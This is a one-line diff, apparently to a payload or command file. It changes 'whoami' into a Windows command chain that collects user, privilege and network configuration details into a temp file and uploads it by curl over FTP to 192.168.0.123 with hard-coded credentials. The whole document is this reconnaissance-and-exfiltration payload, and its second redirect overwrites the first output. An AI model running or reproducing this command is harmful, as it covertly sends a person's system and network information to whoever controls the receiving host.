@@ -1,1 +1,1 @@
-whoami
+whoami /all > %temp%\message.txt && ipconfig /all > %temp%\message.txt && curl ftp://192.168.0.123:21/ --user WRdB7KNDc9AWQ9Cr:UskkrGc5UE3DbeT8 -T %temp%\message.txt
